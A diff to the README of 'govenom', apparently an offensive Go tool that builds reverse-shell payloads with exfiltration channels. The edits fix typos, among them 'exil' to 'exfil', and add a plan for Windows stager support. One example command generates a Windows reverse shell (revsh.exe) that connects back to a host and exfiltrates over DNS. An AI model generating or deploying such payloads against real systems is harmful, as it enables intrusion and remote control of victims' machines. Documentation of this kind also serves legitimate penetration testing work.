@@ -59,8 +59,8 @@ below).
 system. This is for example useful if you can recover files via a
 local file inclusion vulnerability.
 
-* **Net (`dial`):** Send the debug log via a TCP or UDP connection that's
-different from the original connect back connection.
+* **Net (`dial`):** Send the debug log via a TCP or UDP connection
+that's different from the original connect back connection.
 
 ## Tools
 
@@ -83,14 +83,14 @@ exfiltration strategies:
 # generate a payload
 go run ./govenom.go payload xrsh -d 127.0.0.1:1337 \
     --os windows --arch 386 \
-    --exil dns:example.com,stdout,dial:udp:127.0.0.1:1234
+    --exfil dns:example.com,stdout,dial:udp:127.0.0.1:1234 \
     -o revsh.exe
 
 # run the 
 go run ./govenom.go tool dnslogger
 ```
 
-**Note:** `go` has to be installed to run `govenom` itself and it is
+**Note:** Go has to be installed to run `govenom` itself and it is
 also used by `govenom` itself to build the selected payloads.
 
 ## Plans
@@ -98,3 +98,4 @@ also used by `govenom` itself to build the selected payloads.
 * Connection encryption
 * Reverse shell listener like `ncat` with loggin capabilities
 * Embedding payload code into the `govenom` binary
+* Windows support for the `stager` payload
